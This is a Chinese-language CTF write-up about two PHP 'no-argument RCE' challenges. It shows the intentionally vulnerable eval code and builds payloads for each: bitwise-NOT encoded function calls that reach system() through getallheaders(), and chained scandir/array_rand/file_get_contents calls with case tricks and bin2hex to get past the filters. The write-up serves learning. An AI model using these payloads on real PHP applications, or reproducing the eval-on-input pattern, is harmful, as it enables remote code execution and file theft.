---
title :几道关于无参数的题

---

## 

## 第一题

```php
  <?php
show_source(__FILE__);
    $code = $_GET['code'];
    if(strlen($code) > 70 or preg_match('/[A-Za-z0-9]|\'|"|`|\ |,|\.|-|\+|=|\/|\\|<|>|\$|\?|\^|&|\|/is',$code)){
        die('Your Guojingming');
    }else if(';' === preg_replace('/[^\s\(\)]+?\((?R)?\)/', '', $code)){
        @eval($code);
    }

?>  
```

查看源码中第一个过滤中还可以利用的字符，发现`~`，和`()`都没有被过滤，想到可以利用取反

但是由于第二个过滤，`\`表示将下一个字符标记符、或一个向后引用、或一个八进制转义符。例如，"\\n"匹配\n。"\n"匹配换行符。即相当于多种编程语言中都有的"转义字符"的概念。所以这道题中的`\(\)`表示匹配`(`和`)`。

`\s`表示出现空白就匹配，`^`匹配输入字行首，`?`匹配前面的字表达式零次或一次。

[a-z]    匹配所有的小写字母

[A-Z]    匹配所有的大写字母

[a-zA-Z]   匹配所有的字母

[0-9]               匹配所以的数字，句子和减号

因为`[^,]`匹配除了逗号之外的任何字符，所以`[^\s\(\)]`是匹配除了空格，（ 和 ）以外的所有字符。

（?R)是引用当前表达式的意思，例如\w+\((?R)?\)，可以用\w+\((?R)?\)替换到(?R)的位置，因此可以衍生成匹配\w+\(\w+\((?R)?\)\)、\w+\(\w+\(\w+\((?R)?\)\)\)、等等。(?R)? 这里多一个?表示可以有引用，也可以没有。所以在这道题中`?\((?R)?\)/`, `\(`表示匹配(，`\)`表示匹配），第二个过滤表示匹配到函数就会被替换为空，最后只剩下`;`就可以执行eval语句。

根据给出的提示，php二维数组能够构造字符串

![6](https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E7%AC%A6/2.jpg)

首先构造读取当前目录的文件

```
var_dump(scandir(pos(localeconv())));

[~%89%9E%8D%A0%9B%8A%92%8F][!%FF]([~%8C%9C%9E%91%9B%96%8D][!%FF]([~%8F%90%8C][!%FF]([~%93%90%9C%9E%93%9A%9C%90%91%89][!%FF]())));
```

发现该目录上不存在flag文件，读取上一层目录文件看看

```
var_dump(scandir(dirname(getcwd())));

?code=[~%89%9E%8D%A0%9B%8A%92%8F][!%FF]([~%8C%9C%9E%91%9B%96%8D][!%FF]([~%9B%96%8D%91%9E%92%9A][!%FF]([~%98%9A%8B%9C%88%9B][!%FF]())));
```

发现也不存在flag文件，读取当前所在的目录名

```
var_dump(dirname(getcwd()));

?code=[~%89%9E%8D%A0%9B%8A%92%8F][!%FF]([~%9B%96%8D%91%9E%92%9A][!%FF]([~%98%9A%8B%9C%88%9B][!%FF]()));
```

我们知道`var/www/html`是Apache的默认路径，源码保存在`var/www/index.php`中，在`var/www`目录下没有找到flag，在`var`目录下也没有flag。

最后只能利用`getallheaders()`来获取参数RCE

```
echo(system(end(getallheaders()))); 
```

```
?code=[~%8F%8D%96%91%8B%A0%8D][!%FF]([~%8C%86%8C%8B%9A%92][!%FF]([~%9A%91%9B][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]())));
```

列出一些函数的用法：

**scandir()**    列出目录中的文件和目录
用法：scandir(directory,sorting_order,context);
directory                必需，规定要扫描的目录
sorting_order            可选，默认是0，表示按字母升序排列；设置为1，表示按字母降序排列

context              可选。*context* 是可修改目录流的行为的一套选项。

当传入的参数是('.')时，也就是scandir('.'),可以读取当前目录中的文件和目录，同理，当传入（../)时，可以读取上一层目录中的文件和目录。

**localeconv()函数**    函数返回一包含本地数字及货币格式信息的数组。

![](![6](https://zhuang-yongyi.gitee.io/yoyo/%E6%97%A0%E5%AD%97%E7%AC%A6/3.jpg)

可以看到第一个元素为点，我们可以使用pos()，current()构造出这个点。

所以`var_dump(scandir(pos(localeconv())));`读取当前目录中的目录和文件。

**dirname()函数**，返回路径中的目录部分。

语法：dirname(path)

path参数是一个包含了指向一个文件的全路径的字符串。该函数返回去掉最后一个文件或目录后的目录名。

**getcwd()函数**   获取当前工作目录。

所以`var_dump(scandir(dirname(getcwd())));`可以读取上一个目录中的目录和文件名。

尝试使用`scandir(../../)`返回上上层目录文件和文件名。        

根据php二维数组能够构造字符串，构造payload

```
?code=[~%89%9E%8D%A0%9B%8A%92%8F][!%FF]([~%8C%9C%9E%91%9B%96%8D][!%FF]([~%D1%D1%D0][!%FF]));
```

发现在没有过滤的条件下可以执行。

也可以绕过第一个过滤。

但是第二个过滤不能绕过，仔细分析第二个过滤，发现这就是一个无参数RCE的绕过！！！(?R)?，这个意思为递归整个匹配模式。所以正则的含义就是匹配无参数的函数，内部可以无限嵌套相同的模式（无参数函数）scandir函数传入了参数，所以不能通过。

```
var_dump(scandir(pos(localeconv())))  //可以使用
var_dump(scandir('.'))  //不能使用
```

## 第二题

```php
 <?php
//flag in flag.php
$a="";
if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {    
    if(preg_match("/ses|pos|end|next|name|chdir|var|impolode|tan|tall|sys|eval|var|high|show|read|base|url|print/", $_GET['code'])){
        die("no no no !");
    }
    eval("\$a=".$_GET['code']);
    if(preg_match('/flag/', $a)){
        die("no");
    }
    echo($a);
} else {
    show_source(__FILE__);
}
?>  
```

\w等价于[A-Za-z0-9]

第一个过滤可以看出只能传入无参数RCE，

首先构造读取当前目录文件，

因为scandir()函数没有被过滤，想到可以利用scandir('.')函数读取文件目录，但是scandir('.')函数不满足无参数RCE的形式，所以我们需要构造这个点。

利用localeconv() 取点，localeconv() 会返回当地的金融信息的数组，而第一个元素即为点，构造方法只需取第一个元素即可 pos()、current() 均可。

又因为pos被过滤，所以使用current函数来构造点，所以使用`scandir(current(localconv()))`来构造点。

常用PHP输出函数有

```php
echo "hello world!";//只能打印字符串
print_r("hello world!");//能够打印数组和字符串
var_dump("hello world!");//能够打印数组和字符串同时输出打印内容的数据类型
var_export("hello world!",true);//能够将字符串转换为php代码，第二个参数设置为true能够返回值
die("hello world!");//结束程序并打印内容
print()函数输出一个或多个字符串。
printf()函数，输出格式化的字符串
sprintf()函数，把百分号（%）符号替换成一个作为参数进行传递的变量
```

因为输出scandir('.')的内容为数组，所以我们需要寻找可以打印数组的字符串。

发现有print_r，var_dump都可以打印数组，但是在这道题中，print_r和var_dump都被过滤了

到这里就没有思路了，看wp发现可以利用file_get_contents函数

`file_get_contents()函数`

把整个文件读入一个字符串中，和file()一样，不同的是file_get_contents()把文件读入一个字符串。

例子

```php
<?php
echo file_get_contents("test.txt");
?>
```

这个函数可以打开文件，输入的文件名为字符串的形式。我们本来想要找的是一个打印数组的函数，那这个file_get_contents函数可以怎么利用？

到这里还不是很能理解，先利用这道题没有对大小写字母进行严格的过滤进行操作，这道题目过滤了var，我们可以把其中一个字母该为大写，例如Var_dump，vArdump，vaRdump来操作。

可以看到当前目录下存在flag.php，但是该文件存在于目录的中间位置。开始的想法是打乱数组，找到了一个shuffle()函数，该函数随机排列数组单元的顺序（将数组打乱）并为数组中的单元赋予新的键名，删除原有的键名。

若成功，则返回ture，否则返回false。

```php
<?php
$arr = array("a"=>1, "b"=>2, "c"=>3, "d"=>4, "e"=>5);
shuffle($arr);  //打乱数组
print_r($arr);  //输出Array([0] => 5 [1] => 2 [2] => 1 [3] => 4 [4] => 3)
print_r(shuffle($arr));//输出1  （true）
shuffle(array("a"=>111,"b"=>222));//报错
```

可以看出，这个函数并不适合无参数rce。

找到另外一个随机函数，array_rand()函数。

`array_rand()函数`

返回数组中的随机键名，从数组中随机选出一个或多个元素，并返回。

第二个参数用来确定要选出几个元素。如果规定函数返回不只一个键名，则返回包含随机键名的数组。函数从数组中随机选出一个或多个元素，并返回。

array_rand(array,number)

可以看出，返回一个键名符合无参数rce的要求。

但是，这个函数返回的是键名，而键值“flag.php"才是我们的目的，想到了反转数组，可以利用array_flip()函数。

`array_flip()函数`

反转数组中所有的键以及它们关联的值。

这样，我们就可以通过反转数组和array_rand()函数得到我们想要的flag.php字段。

先通过反转数组，再通过array_rand()函数返回数组中的随机键值，当输出flag.php时即为我们想要得到的内容。

我们可以看出，当输出flag.php是以字符串的形式输出的。

到这里我们就可以联想到file_get_contents函数的用法，我们可以使用file_get_contents(flag.php)来读取flag.php的内容。

```
file_get_contents(array_rand(array_flip(scandir(current(localeconv())))));
```

通过返回的页面为空白和no我们测试，空白的原因是因为输出的文件是没有内容的，输出no的原因通过观察源码我们可以得到，是因为输出的文件内容里含有flag字符。

可以想到利用编码来绕过这个过滤，第一个想到的是base64编码，但是base被过滤，因为过滤不严格，可以用大写字母绕过，解码可得flag。

当过滤严格，不能使用大写绕过时，可以用bin2hex编码

```
bin2hex(file_get_contents(array_rand(array_flip(scandir(current(localeconv()))))));
```

